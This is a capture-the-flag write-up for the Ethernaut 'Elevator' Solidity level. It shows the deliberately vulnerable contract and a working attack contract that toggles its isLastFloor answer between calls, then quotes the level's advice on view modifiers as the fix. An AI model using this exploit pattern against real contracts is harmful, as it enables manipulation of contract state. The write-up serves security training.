# Elevator 🛗

Eleventh Challenge description is as follows:

This elevator won't let you reach the top of your building. Right?

Things that might help:
- Sometimes solidity is not good at keeping promises.
- This `Elevator` expects to be used from a `Building`.

Code:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

```

### Resolution
The goal of the level is to set the `top` variable to `true` when you call the `goTo` function.

For what we can see in the code and one of the clues, we need to call the `goTo` function from a contract that implements `Building` interface method `isLastFloor(uint)` and return a bool value.

The "problem" relies in the check `if (! building.isLastFloor(_floor))` because we could return `false` so that check passes but then the `top` variable will be set to `false` as well.

So solution, should be an implementation that returns `false` the first time, and next time it's called returns `true`. There's many ways to go about this implementation, but a key thing here is that there's no other modifier on the interface definition like `view` or `pure` that doesn't allow us to change the state, so we can easily create a contract with an internal variable that changes every time is called.

 Let's explore that solution:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

// Define the interface of Elevator so we can call the method easily:
interface IElevator {
    function goTo(uint _floor) external;
}

// Define the interface of Building to implement
interface Building {
  function isLastFloor(uint) external returns (bool);
}

// Make Contract conform to Building:
contract Attack__Elevator is Building {
    
    // Elevator Contract:
    IElevator private elevatorContract;

    // Internal variable on our contract that we are allowed to modify:
    bool private lastFloor;

    // Constructor - create elevator reference and set variable to false
    constructor(address _elevatorAddress) {
        elevatorContract = IElevator(_elevatorAddress);
        lastFloor = false;
    }

    function callGoTo(uint floor) external {
        elevatorContract.goTo(floor);
    }

    // Implementation that changes value every time is called
    function isLastFloor(uint) override external returns (bool) {
        bool lastFloorReturn = lastFloor;
        lastFloor = !lastFloor;
        return lastFloorReturn;
    }
}
```

Deploy the contract, call `callGoTo` and Bob is your uncle XD! 

After beating the level, there's a great feedback on this level vulnerability:

You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.

An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. `gasleft()`.

## License

[MIT](https://choosealicense.com/licenses/mit/)